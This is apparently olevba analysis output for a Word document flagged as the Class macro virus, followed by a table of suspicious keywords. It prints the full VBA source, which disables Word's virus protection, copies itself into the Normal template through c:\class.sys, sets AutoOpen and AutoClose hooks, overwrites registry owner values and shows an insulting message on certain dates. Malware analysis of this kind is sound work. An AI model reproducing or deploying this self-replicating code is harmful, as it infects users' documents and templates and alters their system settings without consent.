olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-79716d4a59ae5715c4230b2ab225b28b84ac650d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-79716d4a59ae5715c4230b2ab225b28b84ac650d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Const REG_SZ As Long = 1
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Const HKEY_CURRENT_USER As Long = &H80000001
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Sub AutoOpen()
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
On Error GoTo out
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Options.VirusProtection = False
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Options.SaveNormalPrompt = False
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Options.ConfirmConversions = False
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If nt > 70 And ad > 0 Then GoTo out
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If nt < 70 Then
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End If
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
host.codemodule.AddFromFile ("c:\class.sys")
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
With host.codemodule
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    For x = 1 To 16
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    .deletelines 1
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    Next x
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End With
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If nt < 70 Then
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    With host.codemodule
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    .replaceline 1, "Sub AutoClose()"
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    .replaceline 91, "Sub ToolsMacro()"
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    For x = 70 To 81
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
        .deletelines 62
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    Next x
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    .replaceline 35, "    For x = 1 To 4"
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    End With
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End If
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If nt < 70 Then
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
u = RegCloseKey(k)
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End If
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
With host.codemodule
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    For x = 2 To 104 Step 2
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
    Next x
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End With
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
out:
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End Sub
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
Sub ViewVBCode()
'L. Frank Cordero10/13/99 3:57:56 PMHP LaserJet 4 on LPT1:FOREIGNER AFFIDAVIT
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

